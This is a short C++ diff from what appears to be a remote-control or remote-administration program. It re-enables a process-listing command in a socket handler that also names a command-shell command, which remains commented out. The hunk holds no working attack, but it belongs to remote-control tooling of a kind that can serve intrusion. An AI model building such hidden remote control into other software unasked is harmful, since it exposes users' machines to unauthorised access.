@@ -183,7 +183,7 @@ UINT __cdecl CClientSock::MyRecvFunction( LPVOID pParam )
 				pDlg->SendMessage(WM_ONLINE);
 				break;
 			case MYGETPROCESS:
-			//	pDlg->m_Process->ProcessComment(command);
+				pDlg->m_Process->ProcessComment(command);
 				break;
 			case MYCMDSHELL:
 			//	pDlg->m_CmdShell->CmdCommand(command);
